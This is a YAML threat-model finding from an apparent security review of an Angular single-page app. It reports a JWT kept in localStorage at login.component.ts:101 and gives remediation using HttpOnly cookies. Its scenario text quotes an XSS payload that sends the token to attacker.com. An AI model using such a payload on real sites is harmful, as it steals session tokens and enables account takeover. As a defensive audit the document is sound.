threats:
- local_id: angular-spa-006
  threat_category_id: TH-04
  additional_categories:
  - TH-11
  stride: Information Disclosure
  cwe: CWE-922
  title: JWT Bearer Token Stored in localStorage — login.component.ts:101
  affected_parameter: token
  scenario: '`login.component.ts:101` calls `localStorage.setItem(''token'', authentication.token)` immediately after successful
    login. The same pattern appears at `oauth.component.ts:51` for OAuth-based logins. The JWT stored in `localStorage` is
    accessible to any JavaScript running on the same origin — including the multiple XSS sinks confirmed at angular-spa-003,
    -004, and -005. An XSS payload as simple as `fetch(''https://attacker.com/?t=''+localStorage.getItem(''token''))` exfiltrates
    the session token, enabling full account takeover. There is no BFF or server-managed `HttpOnly` session cookie pattern
    in use.'
  evidence_summary: '`localStorage.setItem(''token'', ...)` is called immediately on login success in both the password-login
    and OAuth-login paths, storing the bearer token in JavaScript-accessible browser storage.'
  impact_description: Any successful XSS attack can exfiltrate the JWT from localStorage, providing an attacker with a valid
    bearer token for the victim's account for up to 8 hours.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: None — token is stored in plain localStorage with no isolation.
  mitigation_title: Move token storage to HttpOnly Secure SameSite=Strict cookies managed by the server
  remediation:
    effort: High
    steps:
    - Remove all `localStorage.setItem('token', ...)` calls from the frontend (login.component.ts:101, oauth.component.ts:51,
      two-factor-auth-enter.component.ts, chatbot.component.ts:100).
    - 'Have the Express backend set the JWT as an `HttpOnly; Secure; SameSite=Strict` cookie via `res.cookie(''token'', jwt,
      { httpOnly: true, secure: true, sameSite: ''strict'' })` after successful authentication.'
    - 'Update `request.interceptor.ts` to remove the manual `Authorization: Bearer` header injection — the browser will send
      the HttpOnly cookie automatically.'
    - Deploy a Backend-for-Frontend (BFF) layer if the SPA must call third-party APIs, so tokens never need to be held in
      JavaScript-accessible storage.
    code_example: "// Express backend — routes/login.ts\nres.cookie('token', token, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV\
      \ === 'production',\n  sameSite: 'strict',\n  maxAge: 8 * 60 * 60 * 1000 // 8 hours\n});\n// Frontend interceptor no\
      \ longer needed — remove Authorization header injection"
    reference: CWE-922
  evidence:
  - file: frontend/src/app/login/login.component.ts
    line: 101
  evidence_check: verified
  controls_absent_evidence: null
  prior_finding_ref: null
  architectural_violation: true
